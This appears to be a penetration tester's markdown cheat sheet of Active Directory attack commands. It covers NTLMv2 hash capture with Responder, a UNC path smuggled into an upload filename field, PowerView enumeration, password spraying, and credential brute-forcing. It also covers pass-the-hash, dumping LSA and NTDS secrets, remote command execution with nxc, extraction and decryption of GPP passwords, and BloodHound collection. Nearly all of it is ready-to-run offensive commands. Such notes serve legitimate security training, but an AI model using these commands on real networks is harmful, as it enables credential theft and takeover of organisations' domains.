# 🔭 AD Enumeration

## Capturing NTLMv2 Hashes

!!! info
    🐈‍⬛ Hashcat mode -> 5600

```shell
# responder
sudo responder -I eth0

# smb server
impacket-smbserver -smb2support <sharename> $(pwd)
```

### UNC Attack

```shell
# from inside the machine (shortcut file, shell or web attack)
dir \\<IP>\test
Content-Disposition: form-data; name="myFile"; filename="\\\\<ip>\\test"
```

## Living off the Land

```shell
# list domain users
net user /domain
net user /domain <username>
# list domain groups
net group /domain
net group /domain <groupname>

# add user to group
net group <groupname> <username> /add /domain

# list a share
ls \\dc1.corp.com\sysvol\corp.com\

# password policies
net accounts /domain

# get current domain name
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

## PowerView

```shell
# if scripts can be imported
powershell -ep bypass
Import-Module .\PowerView.ps1

# domain info
Get-NetDomain
# list users
Get-NetUser
Get-NetUser | select cn
Get-NetUser <usercn>
# list groups
Get-NetGroup
Get-NetGroup | select cn
Get-NetGroup <groupcn> | select member
# list computers
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

# find local admin access under current user
Find-LocalAdminAccess
# see who is logged on
Get-NetSession -ComputerName <computer>
# if fails, use psloggedon.exe, needs Remote Registry active on host
PsLoggedon.exe \\<computer>

# list spn
Get-NetUser -SPN | select samaccountname,serviceprincipalname
# or
setspn -L iis_service
# list Access Control Entries (ACE) of user
Get-ObjectAcl -Identity <user>
# convert SID to name
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

# filter by perm GenericAll for a specific group
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# find AS-REP Roastable accounts
Get-DomainUser -PreauthNotRequired -verbose
# find kerberoastable accounts
Get-NetUser -SPN | select serviceprincipalname

# find shares
Find-DomainShare
```

## Password Spraying

> <https://github.com/ropnop/kerbrute>

```shell
# nxc or cme
nxc smb <ip> -u users.txt -p <password> -d <domain> --continue-on-success

# kerbrute
kerbrute passwordspray -d <domain> users.txt <password> --dc <dc_ip>
```

## User Enumeration

> <https://github.com/lkarlslund/ldapnomnom>

```shell
# enum users via Kerberos
kerbrute enumusers --dc <ip> -d <domain> <userlist>

ldapnomnom -dnsdomain <domain> -server <dc-ip> -input <wordlist>

nxc smb <ip> -u <user> -p <pass> --users

# windows
.\Rubeus.exe brute /users:<userlist> /passwords:<wordlist> /domain:<domain>
```

## Credential Testing

!!! tip
    🍪 NetExec

    - `[+]` is valid credentials
    - `[pwned!]` is valid credential with privileges 

```shell
# nxc
# check valid domain credentials
nxc smb <ip> -u <user> -p <password> -d <domain>
# check valid local credentials
nxc smb <ip> -u <user> -p <password> --local-auth

# check in a range of machines
nxc smb x.x.x.70-76 -u <user> -p <password> -d <domain> --continue-on-success

# with a userlist and wordlist
nxc smb <ip> -u <userlist> -p <wordlist> -d <domain> --continue-on-success

# list shares, users or all
nxc smb <ip> -u <user> -p <pass> -d <domain> --shares
nxc smb <ip> -u <user> -p <pass> -d <domain> --users
nxc smb <ip> -u <user> -p <pass> -d <domain> --all

# dump lsa or ntds
nxc smb <ip> -u <user> -p <pass> --lsa
nxc smb <ip> -u <user> -p <pass> --ntds

# enumerate users by rid
nxc smb <ip> -u 'guest' -p '' --rid-brute

# execute a command
nxc smb <ip> -u <user> -p <pass> -x <command>

# PTH
nxc smb <ip> -u <user> -H <hash> 

# kerbrute
kerbrute brute -d <domain> -u <user> -p <wordlist>
```

## GPP password in SYSVOL policy

```shell
# manual
grep -inr "cpassword" . --include=*.xml

# GPPPassword
# with NULL session
impacket-Get-GPPPassword -no-pass <ip>
# with creds
impacket-Get-GPPPassword <domain>/<user>:<pass>@<ip>
# parse a local file
impacket-Get-GPPPassword -xmlfile <Policy>.xml local

# nxc
nxc smb <ip> -u <user> -p <pass> -d <domain> -M gpp_password
```

Decrypt the password

```shell
gpp-decrypt <pass>
```

## BloodHound

```shell
sudo neo4j start
bloodhound
# upload collected zip 
```

### SharpHound

!!! warning
    For Bloodhound legacy (4.3.1) compatibility, use sharphound [v1.1.1.1](https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.1)

```shell
.\SharpHound.exe -c All

Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix "dom audit"
```

### bloodhound-python

```shell
bloodhound-python -c All -u <user> -p <pass> -d <domain> -dc <dc_hostname> -ns <ns_ip> --zip 
```

## LDAPDomainDump

```shell
ldapdomaindump -u '<domain>\<user>' -p '<pass>' <ip>
```

## Automated Enumeration

### ADpeas

> <https://github.com/61106960/adPEAS>

```shell
Import-Module .\adPEAS.ps1
Invoke-adPEAS
```
